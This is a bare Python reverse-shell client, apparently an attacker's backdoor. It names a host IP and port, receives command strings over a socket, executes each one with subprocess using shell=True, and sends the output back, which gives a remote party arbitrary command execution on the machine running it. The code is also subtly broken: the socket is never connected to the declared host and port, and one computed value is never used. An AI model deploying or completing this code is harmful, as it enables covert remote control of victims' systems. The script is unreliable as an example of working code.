import socket
import os
import subprocess

a = socket.socket()
host ="192.168.43.251"
port = 3333


while True:
    data = a.recv(1024)
    if data[:2].decode("utf-8") == 'cd':
        os.chdir(data[3:].decode("utf-8"))
    
    if len(data) > 0:
        cmd = subprocess.Popen(data[:].decode("utf-8"),shell=True,stdout=subprocess.PIPE,stdin=subprocess.PIPE,stderr=subprocess.PIPE)
        output_byte = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_byte,"utf-8")
        current_dir = os.getcwd()+">"
        a.send(str.encode(output_str))
        print(output_str)